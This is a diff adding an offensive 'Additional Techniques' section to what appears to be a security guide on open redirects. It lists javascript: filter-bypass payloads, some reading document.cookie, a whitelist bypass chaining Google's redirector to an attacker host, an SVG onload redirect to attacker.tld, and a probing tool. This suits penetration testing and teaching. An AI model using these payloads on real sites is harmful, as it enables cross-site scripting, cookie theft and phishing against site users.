@@ -163,3 +163,49 @@ Open redirects enable phishing, OAuth/OIDC code and token theft, and allowlist b
 ## Summary
 
 Redirection is safe only when the final destination is constrained after canonicalization. Enforce exact origins, verify per hop, and treat client-provided destinations as untrusted across every stack.
+
+
+
+## Additional Techniques — ported from WebSkills (open-redirect-test)
+
+### Escalate Open Redirect → XSS (javascript: scheme arsenal)
+
+When the redirect sink writes the destination into `location.href`/`window.location` (or an `<a href>`) without scheme-pinning to http/https, a `javascript:` URI executes. Filter-bypass variants to walk when `javascript:` is naively blocked:
+
+```
+javascript:alert(1)
+java%00script:alert(1)
+java%0Ascript:alert(1)
+java&tab;script:alert(1)
+java%0d%0ascript%0d%0a:alert(0)
+javascript://%250Aalert(1)
+javascript://%250Aalert(1)//?1
+%09Jav%09ascript:alert(document.domain)
+/%09/javascript:alert(1);
+//%5cjavascript:alert(1);
+\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
+javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
+javascript://https://whitelisted.com/?z=%0Aalert(1)
+jaVAscript://whitelisted.com//%0d%0aalert(1);//
+javascript://whitelisted.com?%a0alert%281%29
+/x:1/:///%01javascript:alert(document.cookie)/
+javascript:%61lert(1)
+javascript:&#37&#54&#49lert(1)          # HTML-entity encoded
+```
+The whitelisted-domain variants (`javascript://whitelisted.com/...%0aalert(1)`) matter when the app enforces a host allowlist on the redirect but still feeds the value to a client-side navigation sink.
+
+### Whitelist bypass via trusted redirector
+```
+# Target only accepts google.com → chain google's own open redirect:
+https://google.com/amp/s/poc.attacker.com
+```
+
+### Open Redirect via SVG file upload
+If an upload feature serves SVGs inline, an uploaded SVG can drive a client-side redirect (chains with insecure_file_uploads.md):
+```xml
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<svg onload="window.location='http://attacker.tld'" xmlns="http://www.w3.org/2000/svg"></svg>
+```
+
+### Tooling
+- [Oralyzer](https://github.com/0xNanda/Oralyzer) — automated open-redirect (and CRLF) probing across a param/URL list.
